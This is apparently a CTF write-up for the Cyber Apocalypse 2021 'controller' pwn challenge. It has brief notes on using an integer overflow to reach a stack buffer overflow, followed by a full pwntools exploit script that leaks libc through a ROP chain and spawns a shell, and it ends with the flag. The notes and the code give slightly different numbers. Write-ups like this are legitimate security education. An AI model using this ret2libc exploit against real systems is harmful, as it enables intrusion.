---
title: controller
date: 2021-04-23
categories: [pwn]
tags: [cyberapocalpyse2021]
toc: false
---

#### Notes:
- Binary has only NX enabled and full relro
- Buffer overflow exists in calculator() when return value of calc() is 0xff3a (65538)
- It seems we need a integer overflow to trigger a buffer overflow
- calc() allows us to calculate values using two signed integers

#### Plan:
- Trigger integer overflow by multiplying -65538 with -1 to get 65538
- Use this to get to the else statement in calculator() to do a buffer overflow and get a shell

#### calculator()

![Snippet of calculator()](/assets/img/cyberapoc/controller/calculator.png)

#### calc()

![Snippet of calc()](/assets/img/cyberapoc/controller/calc.png)


#### PoC:
```python3
#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host 138.68.132.86 --port 31438 ./controller
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('./controller')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or '138.68.132.86'
port = int(args.PORT or 31438)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
b *0x4010fd
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)

io = start()

pop_rdi_ret = 0x4011d3
puts_got = 0x601fb0
puts_plt = 0x400630
ret = 0x400606
_start = 0x4006b0

payload = flat({
    40: p64(pop_rdi_ret),
    48: p64(puts_got),
    56: p64(puts_plt),
    64: p64(ret),
    72: p64(_start)
    })

def send_numbers():
    io.recvuntil('recources: ')
    io.sendline('-65338 -1')
    io.recvuntil('> ')
    io.sendline('3')

send_numbers()

io.recvuntil('> ')
io.sendline(payload)
io.recvuntil('ingored\n')
leak = int.from_bytes(io.recvline()[-7:-1], 'little')

print('Leak: ', hex(leak))

libc_base = leak - 0x080aa0

print('Libc base: ', hex(libc_base))

str_bin_sh = libc_base + 0x1b3e1a
system = libc_base + 0x04f550

send_numbers()

payload2 = flat({
    40: p64(pop_rdi_ret),
    48: p64(str_bin_sh),
    56: p64(ret),
    64: p64(system),
    72: p64(ret)
    })

io.recvuntil('> ')
io.sendline(payload2)

io.interactive()

#CHTB{1nt3g3r_0v3rfl0w_s4v3d_0ur_r3s0urc3s}
```